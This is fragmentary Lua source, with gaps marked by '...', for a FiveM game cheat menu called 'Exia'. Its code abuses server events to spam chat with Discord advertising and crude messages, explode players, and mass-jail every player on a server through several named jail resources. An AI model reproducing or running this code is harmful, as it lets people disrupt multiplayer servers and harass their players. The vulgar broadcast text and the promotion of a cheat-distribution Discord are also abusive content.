...
local function bE()
    if bC == 3 then
        ...
        local ak = KeyboardInput('Get your password from https://discord.gg/dHtrysD', '', 100)
        if ak == bD then
            mhaonn = true
        ...
        function()
            for bD = 0, 9 do
                TriggerServerEvent(
                    ...
                    'A - Banana, lmao. Go fuck<3? Exia https://discord.gg/dHtrysD',
                    {
                        141,
                        211,
                        255
                    },
                    '^' .. bD .. '^1Exia - ^4Best mods - ^3Get from: https://discord.gg/dHtrysD'
                )
            end
            for i = 0, 128 do
...
function RapeAllFunc()
    for bD = 0, 9 do
        TriggerServerEvent(
            '_chat:messageEntered',
            '/ooc Server Raped by: Exia Menu -- Exia https://discord.gg/dHtrysD',
            ...
            '^' .. bD .. 'Server Raped by: Exia Menu -- Exia https://discord.gg/dHtrysD'
        )
    end
    Citizen.CreateThread(
        function()
        ...
        while bw do
            ...
            if blowall then
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'Exploded by Exia made by WaterBOI#4911 and oFlaqmé#1149 -- https://discord.gg/dHtrysD',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'Exploded by Exia made by WaterBOI#4911 and oFlaqmé#1149 -- https://discord.gg/dHtrysD'
                    )
                end
                for i = 0, 128 do
                    Citizen.Wait(500)
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                'Kappa - Exia -- https://discord.gg/dHtrysD',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. 'Kappa - Exia -- https://discord.gg/dHtrysD'
                            )
                        end
                        for i = 0, 128 do
                            TriggerServerEvent(
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Kim Jong-un took your money - Exia https://discord.gg/dHtrysD',
                                4316133778
                            )
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '/ooc Nuked by Kim Jong-un - quote by Exia Menues<3 EXIA MADE BY oFlaqme#1149 -- https://discord.gg/dHtrysD',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '/ooc Nuked by Kim Jong-un - quote by Exia Menues<3 EXIA MADE BY oFlaqme#1149 -- https://discord.gg/dHtrysD'
                            )
                        end
                        for i = 0, 128 do
                            local dl =
    ...
    function()
        ...
        while bw do
            ...
            if LynxEvo.IsMenuOpened('Exia') then
                ...
                av('Exia https://discord.gg/dHtrysD', false)
                av('Exia', false)
                ...
                elseif LynxEvo.Button('~h~~r~Jail~s~ All players') then
                    for i = 0, 128 do
                        TriggerServerEvent(
                            ...
                            GetPlayerServerId(i),
                            5000,
                            'JAIL- KIM JONG-UN aka Exia https://discord.gg/dHtrysD'
                        ) 
                    TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> JAIL- KIM JONG-UN aka Exia https://discord.gg/dHtrysD <--", 9999999999)
                    TriggerServerEvent("luki_jailer:sendToJail", GetPlayerServerId(i), 9937, "--> JAIL- KIM JONG-UN aka Exia https://discord.gg/dHtrysD", 9999999999)
                    end
...
RegisterCommand(
    ...
    function(eA, eB, eC)
        ...
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'Exia https://discord.gg/dHtrysD')
            ...
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'Exia https://discord.gg/dHtrysD')
        end
    end,
    false
)
